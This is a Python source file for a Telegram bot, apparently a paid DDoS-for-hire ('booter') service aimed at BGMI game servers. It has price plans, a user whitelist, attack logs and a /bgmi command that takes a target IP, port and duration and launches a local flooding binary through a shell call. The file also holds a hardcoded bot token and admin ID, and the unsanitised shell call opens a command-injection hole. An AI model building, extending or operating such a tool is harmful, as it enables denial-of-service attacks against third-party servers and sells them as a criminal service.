#!/usr/bin/python3
#Modified by @XThrlen

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import subprocess
import requests
import datetime
import os
import threading

# Bot Token
bot = telebot.TeleBot('8319526068:AAE-jcA2ApPLkO3dr2me5G361KOZDcKxxFM')

# Admin ID
admin_id = ["5730398152"]

# Files
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

allowed_user_ids = []

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Log function
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Main Menu Buttons
def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    btn1 = InlineKeyboardButton("💥 BGMI ATTACK", callback_data="attack_bgmi")
    btn2 = InlineKeyboardButton("📊 MY LOGS", callback_data="mylogs")
    btn3 = InlineKeyboardButton("📜 RULES", callback_data="rules")
    btn4 = InlineKeyboardButton("💰 PLANS", callback_data="plans")
    btn5 = InlineKeyboardButton("🆘 HELP", callback_data="help")
    btn6 = InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    return markup

# Admin Panel Buttons
def admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    btn1 = InlineKeyboardButton("➕ ADD USER", callback_data="admin_add")
    btn2 = InlineKeyboardButton("➖ REMOVE USER", callback_data="admin_remove")
    btn3 = InlineKeyboardButton("📋 ALL USERS", callback_data="admin_allusers")
    btn4 = InlineKeyboardButton("📄 VIEW LOGS", callback_data="admin_logs")
    btn5 = InlineKeyboardButton("🗑️ CLEAR LOGS", callback_data="admin_clearlogs")
    btn6 = InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")
    btn7 = InlineKeyboardButton("🔙 BACK", callback_data="back_main")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    return markup

# /start command
@bot.message_handler(commands=['start'])
def start_command(message):
    user_name = message.from_user.first_name
    welcome_msg = f"✨ **Welcome {user_name}!** ✨\n\n⚡ **ULTIMATE BGMI DDOS BOT** ⚡\n\n👇 **Click buttons below** 👇"
    bot.send_message(message.chat.id, welcome_msg, reply_markup=main_menu(), parse_mode='Markdown')

# /menu command
@bot.message_handler(commands=['menu'])
def menu_command(message):
    bot.send_message(message.chat.id, "🔰 **Main Menu** 🔰", reply_markup=main_menu(), parse_mode='Markdown')

# Handle button clicks
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = str(call.from_user.id)
    
    # BGMI Attack button
    if call.data == "attack_bgmi":
        bot.edit_message_text(
            "⚔️ **BGMI ATTACK** ⚔️\n\n📝 **Send attack command:**\n`/bgmi <target> <port> <time>`\n\n📌 **Example:**\n`/bgmi 1.1.1.1 80 60`\n\n⏰ **Max time:** 180 seconds", 
            call.message.chat.id, 
            call.message.message_id, 
            parse_mode='Markdown'
        )
    
    elif call.data == "mylogs":
        if user_id in allowed_user_ids or user_id in admin_id:
            try:
                with open(LOG_FILE, "r") as f:
                    logs = f.readlines()
                    user_logs = [log for log in logs if f"UserID: {user_id}" in log]
                    if user_logs:
                        response = "📝 **Your Attack Logs:**\n\n" + "".join(user_logs[-10:])
                    else:
                        response = "❌ No logs found!"
            except:
                response = "❌ No logs found!"
        else:
            response = "⛔ **Unauthorized!** Buy Plan @XThrlen"
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif call.data == "rules":
        rules_text = "📜 **RULES** 📜\n\n1️⃣ Don't run too many attacks\n2️⃣ Don't run 2 attacks at same time\n3️⃣ We check logs daily\n4️⃣ Violation = Ban\n\n✅ **Follow rules to avoid ban!**"
        bot.edit_message_text(rules_text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif call.data == "plans":
        plans_text = "💰 **VIP PLAN** 💰\n\n🔥 **Features:**\n• Attack Time: 200 seconds\n• After Attack Limit: 2 minutes\n• Concurrent Attacks: 300\n\n💵 **Prices:**\n• Day: 150 Rs\n• Week: 900 Rs\n• Month: 1600 Rs\n\n📞 **Contact:** @XThrlen"
        bot.edit_message_text(plans_text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif call.data == "help":
        help_text = "🆘 **HELP** 🆘\n\n📌 **Commands:**\n/bgmi - Start BGMI Attack\n/menu - Show Menu\n/id - Get Your ID\n/mylogs - Check Logs\n\n📌 **Usage:**\n/bgmi <IP> <PORT> <TIME>\n\n💡 **Use buttons for easy access!**"
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif call.data == "admin":
        if user_id in admin_id:
            bot.edit_message_text("👑 **ADMIN PANEL** 👑", call.message.chat.id, call.message.message_id, reply_markup=admin_panel(), parse_mode='Markdown')
        else:
            bot.answer_callback_query(call.id, "⛔ Admin Access Only!", show_alert=True)
    
    elif call.data == "back_main":
        bot.edit_message_text("🔰 **Main Menu** 🔰", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
    
    # Admin functions
    elif call.data == "admin_add":
        bot.edit_message_text("➕ **Add User**\n\nSend: `/add <user_id>`", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif call.data == "admin_remove":
        bot.edit_message_text("➖ **Remove User**\n\nSend: `/remove <user_id>`", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif call.data == "admin_allusers":
        if os.path.exists(USER_FILE):
            with open(USER_FILE, "r") as f:
                users = f.read().splitlines()
            text = f"📋 **Total Users: {len(users)}**\n\n" + "\n".join(users) if users else "No users found"
        else:
            text = "No users found"
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif call.data == "admin_logs":
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            bot.send_document(call.message.chat.id, open(LOG_FILE, "rb"))
            bot.answer_callback_query(call.id, "Logs sent!")
        else:
            bot.edit_message_text("No logs found", call.message.chat.id, call.message.message_id)
    
    elif call.data == "admin_clearlogs":
        try:
            with open(LOG_FILE, "r+") as file:
                if file.read() == "":
                    response = "Logs already cleared"
                else:
                    file.truncate(0)
                    response = "Logs cleared successfully"
        except FileNotFoundError:
            response = "No logs found"
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id)
    
    elif call.data == "admin_broadcast":
        bot.edit_message_text("📢 **Broadcast Message**\n\nSend: `/broadcast <your message>`", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    bot.answer_callback_query(call.id)

# Original BGMI Attack Command (same as your script)
bgmi_cooldown = {}

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or user_id in admin_id:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "⏰ **Cooldown!** Wait 5 minutes before next attack."
                bot.reply_to(message, response, parse_mode='Markdown')
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            
            if time > 181:
                response = "❌ Error: Max time is 180 seconds!"
            else:
                # Log the attack
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                
                # Send attack started message
                user_info = message.from_user
                username = user_info.username if user_info.username else user_info.first_name
                response = f"✅ **ATTACK STARTED!** ✅\n\n👤 {username}\n🎯 Target: {target}\n🔌 Port: {port}\n⏱️ Time: {time} seconds\n⚡ Method: BGMI\n\n🔥 **Attack in progress...**"
                bot.reply_to(message, response, parse_mode='Markdown')
                
                # Run the attack
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                
                response = f"🏁 **ATTACK FINISHED!**\n🎯 Target: {target}\n⏱️ Duration: {time} seconds"
                bot.send_message(message.chat.id, response, parse_mode='Markdown')
        else:
            response = "❌ **Wrong Usage!**\n\n✅ Correct format:\n`/bgmi <target> <port> <time>`\n\n📌 Example:\n`/bgmi 1.1.1.1 80 60`"
            bot.reply_to(message, response, parse_mode='Markdown')
    else:
        response = "⛔ **Unauthorized!**\n\nBuy Plan: @XThrlen"
        bot.reply_to(message, response, parse_mode='Markdown')

# Your existing admin commands (keep as they are)
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"✅ User {user_to_add} added successfully!"
            else:
                response = "❌ User already exists!"
        else:
            response = "❌ Usage: /add <userid>"
    else:
        response = "⛔ Admin only!"
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                response = f"✅ User {user_to_remove} removed!"
            else:
                response = f"❌ User {user_to_remove} not found!"
        else:
            response = "❌ Usage: /remove <userid>"
    else:
        response = "⛔ Admin only!"
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                users = file.read().splitlines()
                if users:
                    response = "📋 **Authorized Users:**\n\n"
                    for uid in users:
                        response += f"🆔 {uid}\n"
                else:
                    response = "No users found"
        except FileNotFoundError:
            response = "No users found"
    else:
        response = "⛔ Admin only!"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['logs'])
def show_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            bot.send_document(message.chat.id, open(LOG_FILE, "rb"))
        else:
            response = "No logs found"
            bot.reply_to(message, response)
    else:
        response = "⛔ Admin only!"
        bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                if file.read().strip() == "":
                    response = "Logs already cleared"
                else:
                    file.truncate(0)
                    response = "Logs cleared successfully"
        except FileNotFoundError:
            response = "No logs found"
    else:
        response = "⛔ Admin only!"
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            msg = f"📢 **Broadcast from Admin:**\n\n{command[1]}"
            with open(USER_FILE, "r") as file:
                users = file.read().splitlines()
                for uid in users:
                    try:
                        bot.send_message(uid, msg, parse_mode='Markdown')
                    except:
                        pass
            response = "✅ Broadcast sent!"
        else:
            response = "❌ Usage: /broadcast <message>"
    else:
        response = "⛔ Admin only!"
    bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    response = f"🆔 **Your ID:** `{message.chat.id}`"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or user_id in admin_id:
        try:
            with open(LOG_FILE, "r") as file:
                logs = file.readlines()
                user_logs = [log for log in logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "📝 **Your Logs:**\n\n" + "".join(user_logs[-10:])
                else:
                    response = "No logs found"
        except FileNotFoundError:
            response = "No logs found"
    else:
        response = "⛔ Unauthorized!"
    bot.reply_to(message, response, parse_mode='Markdown')

# Start bot
print("🤖 BGMI Bot Started Successfully!")
print("✅ Buttons Added - Same Attack Method!")
bot.polling()